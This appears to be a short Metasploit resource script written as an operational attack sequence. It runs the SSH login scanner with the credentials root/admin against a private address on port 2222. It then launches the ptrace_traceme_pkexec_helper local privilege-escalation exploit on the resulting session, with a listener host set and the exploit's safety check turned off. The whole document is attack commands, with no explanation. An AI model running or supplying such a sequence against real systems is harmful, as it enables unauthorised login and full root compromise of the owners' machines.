use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.1.1
set RPORT 2222
set USERNAME root
set PASSWORD admin
set VERBOSE true
set gatherproof false
save
run
back

use exploit/linux/local/ptrace_traceme_pkexec_helper
set SESSION -1
set RHOSTS 10.0.1.1
set RPORT 2222
set USERNAME root
set PASSWORD admin
set SSL false 
set LHOST 10.0.0.10
set VERBOSE true
set AutoCheck false

run
